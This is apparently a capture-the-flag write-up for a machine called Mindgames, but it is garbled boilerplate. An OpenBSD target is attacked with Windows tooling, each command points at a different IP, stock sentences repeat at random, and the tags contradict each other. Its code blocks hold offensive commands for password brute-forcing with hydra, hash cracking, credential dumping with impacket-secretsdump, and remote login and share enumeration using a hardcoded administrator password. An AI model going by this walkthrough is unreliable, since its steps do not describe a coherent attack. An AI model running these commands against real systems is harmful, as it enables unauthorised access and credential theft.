---
TitleSEO: "TryHackMe — Mindgames (Easy OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Mindgames (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Mindgames. Constrained Delegation and NTLM Relay to achieve easy compromise on OpenBSD."
Keywords: "easy, reversing, hackthebox, forensics, tryhackme, insane"
URL: "https://zurefx.github.io/writeups/htb-mindgames-510.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mindgames-510/"
Date: "2025-06-05"
Tags: "Easy, Reversing, HackTheBox, Forensics, TryHackMe, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-mindgames-510"
Permalink: "/writeups/htb-mindgames-510.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Mindgames** is rated **Easy** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.121.231.130`.

### Objectives

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.59.83.117 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.54.190.4/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
gobuster dir -u http://10.56.203.197/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.71.220.7 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.81.181 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **NTLM Relay**.

The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.191.185 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.152.192
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.118.1/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

```powershell
evil-winrm -i 10.108.198.76 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.59.88.175 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.157.114 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.126.18.95 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `pwncat`
- `sharphound`
- `netcat`
- `gobuster`
- `crackmapexec`
- `feroxbuster`

### Key Takeaways

- Constrained Delegation
- NTLM Relay
